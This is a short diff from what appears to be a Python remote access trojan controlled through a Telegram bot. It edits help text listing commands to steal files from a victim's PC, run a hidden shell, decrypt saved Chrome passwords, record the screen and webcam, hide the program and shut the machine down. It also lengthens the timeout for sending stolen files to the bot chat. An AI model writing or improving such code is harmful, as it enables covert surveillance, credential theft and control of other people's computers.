@@ -129,7 +129,7 @@ def send_help(message):
         "/download <filename> - Download file from user's PC\n"
         "/shell <command> - Execute commands using a hidden shell\n"
         "/users - Shows all users in the user's PC\n"
-        "/passwords - Decrypt passwords saved in Chrome and sends to the bot\n"
+        "/passwords - Decrypt passwords saved in Chrome\n"
         "/screenrecord <seconds> - Records the screen in x seconds\n"
         "/hide - Hides the compiled python script using hidden attribute\n"
         "/shutdown - Shuts down user's PC\n"
@@ -187,7 +187,7 @@ def download_command(message):
 
     try:
         with open(file_path, 'rb') as file:
-            bot.send_document(message.chat.id, file, caption=f"File '{filename}' downloaded successfully.", timeout=120)
+            bot.send_document(message.chat.id, file, caption=f"File '{filename}' downloaded successfully.", timeout=300)
     except Exception as e:
         bot.send_message(message.chat.id, f"Download failed: {e}")
 
@@ -669,7 +669,7 @@ def webcam_command(message):
     try:
         params = message.text.split()
         if len(params) != 2:
-            raise ValueError("Usage: /webcam <record_time>")
+            raise ValueError("Usage: /webcam <time in seconds>")
         
         record_time = int(params[1])
         
